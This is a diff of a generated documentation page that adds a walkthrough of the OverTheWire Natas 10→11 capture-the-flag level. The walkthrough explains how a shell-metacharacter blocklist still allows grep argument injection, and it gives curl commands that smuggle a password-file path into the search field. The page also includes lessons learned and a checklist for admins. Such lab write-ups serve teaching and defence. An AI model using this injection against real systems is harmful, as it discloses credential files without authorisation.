@@ -1981,6 +1981,29 @@
 
               
             
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../security/toolbelt/metasploit/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Metasploit
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
           </ul>
         </nav>
       
@@ -3090,6 +3113,66 @@
       
         <li class="md-nav__item">
   <a href="#level-10-level-11" class="md-nav__link">
+    <span class="md-ellipsis">
+      Level 10 → Level 11
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Level 10 → Level 11">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#level-goal_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      Level goal
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#short-explanation-of-the-vulnerability_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      Short explanation of the vulnerability
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-by-step-what-i-ran-and-what-the-server-returned_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step-by-step (what I ran and what the server returned)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#lessons-learned-concise_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      Lessons learned (concise)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#quick-defensive-checklist-for-admins_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      Quick defensive checklist for admins
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-10-level-11_1" class="md-nav__link">
     <span class="md-ellipsis">
       Level 10 → Level 11
     </span>
@@ -4429,6 +4512,66 @@
     </span>
   </a>
   
+    <nav class="md-nav" aria-label="Level 10 → Level 11">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#level-goal_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      Level goal
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#short-explanation-of-the-vulnerability_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      Short explanation of the vulnerability
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-by-step-what-i-ran-and-what-the-server-returned_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step-by-step (what I ran and what the server returned)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#lessons-learned-concise_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      Lessons learned (concise)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#quick-defensive-checklist-for-admins_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      Quick defensive checklist for admins
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-10-level-11_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Level 10 → Level 11
+    </span>
+  </a>
+  
 </li>
       
         <li class="md-nav__item">
@@ -5127,6 +5270,101 @@ t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
 -->
 
 <h2 id="level-10-level-11">Level 10 → Level 11</h2>
+<h3 id="level-goal_4">Level goal</h3>
+<p>Read the password for <code>natas11</code> by bypassing a character filter that blocks common command injection metacharacters.<br />
+What you should learn: 
+how input validation can block <em>some</em> injection vectors but still leave grep argument injection wide open, 
+and how to abuse grep's ability to search multiple files.</p>
+<h3 id="short-explanation-of-the-vulnerability_2">Short explanation of the vulnerability</h3>
+<p>The page still uses <code>passthru("grep -i $key dictionary.txt")</code> like Level 9, 
+but now it filters the input with a regex: <code>/[;|&amp;]/</code>.<br />
+That blocks semicolons, pipes, and ampersands — the usual shell command chaining characters.  </p>
+<p>But the filter doesn't block <strong>spaces</strong>.<br />
+That means we can't chain commands, but we <em>can</em> add extra arguments to grep itself.<br />
+Since grep accepts multiple file paths, we can tell it to search both <code>dictionary.txt</code> <em>and</em> <code>/etc/natas_webpass/natas11</code> in a single command.</p>
+<p>The trick: craft a needle that will match something in both files. 
+The letter <code>a</code> appears in the password file (and nearly everything else), 
+so grep will return matches from both files and print them with their filenames prefixed.</p>
+<h3 id="step-by-step-what-i-ran-and-what-the-server-returned_3">Step-by-step (what I ran and what the server returned)</h3>
+<p><strong>1) Inspect the page</strong>
+<div class="highlight"><pre><span></span><code>curl<span class="w"> </span>-u<span class="w"> </span>natas10:natas10password<span class="w"> </span>http://natas10.natas.labs.overthewire.org/
+</code></pre></div></p>
+<p>Server response (relevant part):
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>natas10<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;content&quot;</span><span class="p">&gt;</span>
+
+For security reasons, we now filter on certain characters<span class="p">&lt;</span><span class="nt">br</span><span class="p">/&gt;&lt;</span><span class="nt">br</span><span class="p">/&gt;</span>
+<span class="p">&lt;</span><span class="nt">form</span><span class="p">&gt;</span>
+Find words containing: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">needle</span><span class="p">&gt;&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">submit</span> <span class="na">name</span><span class="o">=</span><span class="s">submit</span> <span class="na">value</span><span class="o">=</span><span class="s">Search</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+
+Output:
+<span class="p">&lt;</span><span class="nt">pre</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">pre</span><span class="p">&gt;</span>
+</code></pre></div></p>
+<p>Observation: the page warns about filtering. Time to check the source.</p>
+<p><strong>2) Fetch the source to see the filter</strong>
+<div class="highlight"><pre><span></span><code>curl<span class="w"> </span>-u<span class="w"> </span>natas10:natas10password<span class="w"> </span>http://natas10.natas.labs.overthewire.org/index-source.html
+</code></pre></div></p>
+<p>Source (cleaned and extracted):
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?</span>
+<span class="nv">$key</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
+
+<span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;needle&quot;</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">))</span> <span class="p">{</span>
+    <span class="nv">$key</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;needle&quot;</span><span class="p">];</span>
+<span class="p">}</span>
+
+<span class="k">if</span><span class="p">(</span><span class="nv">$key</span> <span class="o">!=</span> <span class="s2">&quot;&quot;</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/[;|&amp;]/&#39;</span><span class="p">,</span><span class="nv">$key</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">print</span> <span class="s2">&quot;Input contains an illegal character!&quot;</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="nb">passthru</span><span class="p">(</span><span class="s2">&quot;grep -i </span><span class="si">$key</span><span class="s2"> dictionary.txt&quot;</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></p>
+<p>Observation: 
+The regex <code>/[;|&amp;]/</code> blocks semicolons, pipes, and ampersands.<br />
+But it doesn't block spaces, so we can still inject additional arguments to grep.<br />
+The command becomes: <code>grep -i [our_input] dictionary.txt</code><br />
+If we submit <code>a /etc/natas_webpass/natas11</code>, grep expands that to:<br />
+<code>grep -i a /etc/natas_webpass/natas11 dictionary.txt</code><br />
+Grep will search for <code>a</code> in both files and print matching lines with filenames.</p>
+<p><strong>3) Exploit grep argument injection to read the password</strong>
+<div class="highlight"><pre><span></span><code>curl<span class="w"> </span>-u<span class="w"> </span>natas10:natas10password<span class="w"> </span>-d<span class="w"> </span><span class="s2">&quot;needle=a /etc/natas_webpass/natas11&quot;</span><span class="w"> </span>http://natas10.natas.labs.overthewire.org/
+</code></pre></div></p>
+<p>Server response (relevant part):
+<div class="highlight"><pre><span></span><code>Output:
+<span class="p">&lt;</span><span class="nt">pre</span><span class="p">&gt;</span>
+/etc/natas_webpass/natas11:natas11password
+dictionary.txt:African
+dictionary.txt:Africans
+dictionary.txt:Allah
+dictionary.txt:Allah&#39;s
+dictionary.txt:American
+...
+<span class="p">&lt;/</span><span class="nt">pre</span><span class="p">&gt;</span>
+</code></pre></div></p>
+<h3 id="lessons-learned-concise_3">Lessons learned (concise)</h3>
+<ul>
+<li>Blocking shell metacharacters (<code>; | &amp;</code>) stops command chaining, but doesn't prevent argument injection.  </li>
+<li>If user input is inserted into a command that accepts multiple arguments or files, an attacker can add their own.  </li>
+<li>Grep's multi-file support turns this into trivial file disclosure. Any character likely to appear in both files works as the search pattern.  </li>
+<li>Real protection requires either escaping <em>all</em> input properly, using parameterized execution (no shell), or strict allowlisting.</li>
+</ul>
+<h3 id="quick-defensive-checklist-for-admins_3">Quick defensive checklist for admins</h3>
+<ul>
+<li>Don't rely on blocklists for shell input. Attackers will find what you missed.  </li>
+<li>Avoid shelling out with user data. Use safe APIs or exec arrays that don't invoke a shell.  </li>
+<li>If grep or similar utilities must run with user input, validate against a strict allowlist and use <code>escapeshellarg()</code>.  </li>
+<li>Run the web process with minimal privileges and restrict file access with proper permissions.</li>
+</ul>
+<hr />
+<!--
+UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
+-->
+
+<h2 id="level-10-level-11_1">Level 10 → Level 11</h2>
 <h2 id="level-11-level-12">Level 11 → Level 12</h2>
 <h2 id="level-12-level-13">Level 12 → Level 13</h2>
 <h2 id="level-13-level-14">Level 13 → Level 14</h2>
